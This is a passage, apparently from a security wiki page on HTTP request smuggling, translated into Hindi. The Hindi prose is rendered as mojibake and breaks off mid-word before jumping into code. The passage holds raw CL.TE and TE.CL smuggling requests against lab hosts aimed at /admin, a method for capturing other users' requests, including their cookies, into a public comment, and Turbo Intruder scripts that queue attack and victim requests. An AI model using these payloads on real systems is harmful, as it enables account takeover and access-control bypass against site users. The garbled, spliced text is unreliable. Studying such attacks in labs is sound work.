‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π **‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§è‡§Æ‡•ç‡§¨‡•á‡§°‡•á‡§° ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∞‡§π‡•Ä ‡§π‡•à**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§™‡•Å‡§®‡§∞‡•ç‡§≤‡•á‡§ñ‡§® ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡§æ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

‡§ï‡§à ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§®‡•ã‡§Ç ‡§Æ‡•á‡§Ç, **‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡§æ ‡§ï‡•Å‡§õ ‡§™‡•Å‡§®‡§∞‡•ç‡§≤‡•á‡§ñ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à** ‡§á‡§∏‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§ï‡§ø ‡§µ‡•á ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•ã ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ‡§è‡§Ç, ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§ï‡•Å‡§õ ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§π‡•á‡§°‡§∞‡•ç‡§∏ ‡§ú‡•ã‡§°‡§º‡§ï‡§∞‡•§\
‡§è‡§ï ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§¨‡§æ‡§§ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø **‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§Æ‡•á‡§Ç ‡§π‡•á‡§°‡§∞** `X-Forwarded-For: <IP of the client>` ‡§Ø‡§æ ‡§ï‡•Å‡§õ ‡§á‡§∏‡•Ä ‡§§‡§∞‡§π ‡§ï‡§æ ‡§π‡•á‡§°‡§∞ ‡§ú‡•ã‡§°‡§º‡§®‡§æ ‡§§‡§æ‡§ï‡§ø ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§ï‡•ã ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§ï‡§æ IP ‡§™‡§§‡§æ ‡§ö‡§≤ ‡§∏‡§ï‡•á‡•§\
‡§ï‡§≠‡•Ä-‡§ï‡§≠‡•Ä, ‡§Ö‡§ó‡§∞ ‡§Ü‡§™ **‡§™‡§§‡§æ ‡§≤‡§ó‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§ï‡•å‡§® ‡§∏‡•á ‡§®‡§è ‡§Æ‡§æ‡§® ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡•á ‡§ó‡§è ‡§π‡•à‡§Ç** ‡§§‡•ã ‡§Ü‡§™ **‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§â‡§™‡§æ‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ **‡§õ‡§ø‡§™‡•Ä ‡§π‡•Å‡§à ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä**/**‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§

‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•à‡§∏‡•á ‡§™‡•Å‡§®‡§∞‡•ç‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à ‡§Ø‡§π ‡§ú‡§æ‡§®‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™‡§ï‡•ã **‡§è‡§ï POST ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§¢‡•Ç‡§Ç‡§¢‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ** ‡§â‡§§‡•ç‡§§‡§∞ ‡§Æ‡•á‡§Ç‡•§ ‡§´‡§ø‡§∞, ‡§á‡§∏ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§è‡§ï ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§á‡§∏ ‡§§‡§∞‡§π ‡§ï‡§æ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§Ö‡§ó‡§≤‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß `search=` ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§ú‡•ã‡§°‡§º‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡•ã ‡§Ø‡§π ‡§≠‡•Ä **‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§π‡•à** ‡§â‡§§‡•ç‡§§‡§∞ ‡§Æ‡•á‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§π **‡§Ö‡§ó‡§≤‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§π‡•á‡§°‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ**‡•§

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø **‡§ï‡•á‡§µ‡§≤ ‡§è‡§Æ‡•ç‡§¨‡•á‡§°‡•á‡§° ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á `Content-Length` ‡§π‡•á‡§°‡§∞ ‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§≤‡§Ç‡§¨‡§æ‡§à ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ ‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä**‡•§ ‡§Ö‡§ó‡§∞ ‡§Ü‡§™ ‡§ï‡§Æ ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§ï‡•á‡§µ‡§≤ ‡§ï‡•Å‡§õ ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ ‡§π‡•ã‡§Ç‡§ó‡•á, ‡§Ö‡§ó‡§∞ ‡§Ü‡§™ ‡§∏‡§≠‡•Ä ‡§π‡•á‡§°‡§∞‡•ç‡§∏ ‡§ï‡•Ä ‡§≤‡§Ç‡§¨‡§æ‡§à ‡§∏‡•á ‡§¨‡§°‡§º‡•Ä ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§è‡§Æ‡•ç‡§¨‡•á‡§°‡•á‡§° ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§´‡•á‡§Ç‡§ï ‡§¶‡•á‡§ó‡§æ‡•§ ‡§´‡§ø‡§∞, ‡§Ü‡§™‡§ï‡•ã **‡§õ‡•ã‡§ü‡•Ä ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ** ‡§∏‡•á **‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è** ‡§î‡§∞ ‡§á‡§∏‡•á **‡§¨‡§¢‡§º‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è** ‡§ú‡§¨ ‡§§‡§ï ‡§Ü‡§™ ‡§∏‡§≠‡•Ä ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç‡•§\
‡§Ø‡§π ‡§≠‡•Ä ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§π **‡§§‡§ï‡§®‡•Ä‡§ï TE.CL** ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§≠‡•Ä ‡§∂‡•ã‡§∑‡§£ ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã `search=\r\n0` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§®‡§à ‡§™‡§Ç‡§ï‡•ç‡§§‡§ø ‡§µ‡§∞‡•ç‡§£‡•ã‡§Ç ‡§ï‡•á ‡§¨‡§æ‡§µ‡§ú‡•Ç‡§¶ ‡§Æ‡§æ‡§® ‡§∏‡§∞‡•ç‡§ö ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡•á ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á‡•§

‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§π‡§Æ ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§ñ‡•Å‡§¶ ‡§™‡§∞ ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§ú‡§æ‡§® ‡§∏‡§ï‡•á‡§Ç ‡§ï‡§ø ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã ‡§ï‡•à‡§∏‡•á ‡§™‡•Å‡§®‡§∞‡•ç‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à‡•§

### ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡•à‡§™‡•ç‡§ö‡§∞ ‡§ï‡§∞‡§®‡§æ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

‡§Ö‡§ó‡§∞ ‡§Ü‡§™ ‡§è‡§ï POST ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§¢‡•Ç‡§Ç‡§¢ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§è‡§ï ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•ã ‡§∏‡§π‡•á‡§ú‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ ‡§â‡§∏ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§Ö‡§ó‡§≤‡•á ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§ï‡•á ‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, **‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡§Æ‡•á‡§Ç‡§ü** ‡§ï‡§æ ‡§Æ‡§æ‡§® **‡§è‡§ï ‡§™‡•ã‡§∏‡•ç‡§ü ‡§ï‡•á ‡§ï‡§Æ‡•á‡§Ç‡§ü ‡§Æ‡•á‡§Ç ‡§∏‡§π‡•á‡§ú‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ** ‡§ú‡•ã ‡§™‡•á‡§ú ‡§™‡§∞ **‡§∏‡§æ‡§∞‡•ç‡§µ‡§ú‡§®‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à**, ‡§á‡§∏‡§≤‡§ø‡§è ‡§è‡§ï **‡§ï‡§Æ‡•á‡§Ç‡§ü ‡§Ö‡§ó‡§≤‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á‡§ó‡§æ**‡•§

_‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•Ä ‡§è‡§ï ‡§∏‡•Ä‡§Æ‡§æ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø ‡§Ø‡§π ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§ï‡•á‡§µ‡§≤ ‡§â‡§∏ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§µ‡§ø‡§≠‡§æ‡§ú‡§ï ‡§§‡§ï ‡§°‡•á‡§ü‡§æ ‡§ï‡•à‡§™‡•ç‡§ö‡§∞ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•ã ‡§∏‡•ç‡§Æ‡§ó‡§≤ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§æ‡§ó‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§ URL-‡§è‡§®‡•ç‡§ï‡•ã‡§°‡•á‡§° ‡§´‡•â‡§∞‡•ç‡§Æ ‡§∏‡§¨‡§Æ‡§ø‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ø‡§π `&` ‡§µ‡§∞‡•ç‡§£ ‡§π‡•ã‡§ó‡§æ, ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Ö‡§∞‡•ç‡§• ‡§π‡•à ‡§ï‡§ø ‡§™‡•Ä‡§°‡§º‡§ø‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•á ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§™‡§π‡§≤‡•á `&` ‡§™‡§∞ ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã ‡§ú‡§æ‡§è‡§ó‡•Ä, ‡§ú‡•ã ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§_

‡§Ø‡§π ‡§≠‡•Ä ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§π **‡§§‡§ï‡§®‡•Ä‡§ï TE.CL** ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§≠‡•Ä ‡§∂‡•ã‡§∑‡§£ ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã `search=\r\n0` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§®‡§à ‡§™‡§Ç‡§ï‡•ç‡§§‡§ø ‡§µ‡§∞‡•ç‡§£‡•ã‡§Ç ‡§ï‡•á ‡§¨‡§æ‡§µ‡§ú‡•Ç‡§¶ ‡§Æ‡§æ‡§® ‡§∏‡§∞‡•ç‡§ö ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡•á ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á‡•§

### ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ XSS ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è HTTP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó

‡§Ö‡§ó‡§∞ ‡§µ‡•á‡§¨ ‡§™‡•á‡§ú **‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ XSS ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•Ä ‡§≠‡•á‡§¶‡•ç‡§Ø ‡§π‡•à**, ‡§§‡•ã ‡§Ü‡§™ HTTP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§µ‡•á‡§¨ ‡§ï‡•á ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï‡•ã‡§Ç ‡§™‡§∞ ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ HTTP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§∏‡•á ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§ø‡§Ç‡§¨‡§ø‡§§ XSS ‡§ï‡•á ‡§∂‡•ã‡§∑‡§£ ‡§ï‡•á ‡§ï‡•Å‡§õ ‡§´‡§æ‡§Ø‡§¶‡•á ‡§π‡•à‡§Ç:

* **‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•Ä‡§°‡§º‡§ø‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•ã‡§à ‡§¨‡§æ‡§§‡§ö‡•Ä‡§§ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**
* ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§â‡§® ‡§π‡§ø‡§∏‡•ç‡§∏‡•ã‡§Ç ‡§Æ‡•á‡§Ç XSS ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞ ‡§ï‡§æ **‡§∂‡•ã‡§∑‡§£ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§§
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

‡§∏‡•á: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[‡§Ø‡§π‡§æ‡§Å ‡§∏‡•á ‡§õ‡§µ‡§ø‡•§](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## ‡§â‡§™‡§ï‡§∞‡§£

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): ‡§Ø‡§π ‡§â‡§™‡§ï‡§∞‡§£ ‡§è‡§ï ‡§µ‡•ç‡§Ø‡§æ‡§ï‡§∞‡§£-‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ HTTP Fuzzer ‡§π‡•à ‡§ú‡•ã ‡§Ö‡§ú‡•Ä‡§¨ request smuggling ‡§µ‡§ø‡§∏‡§Ç‡§ó‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§®‡•á ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•à‡•§

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
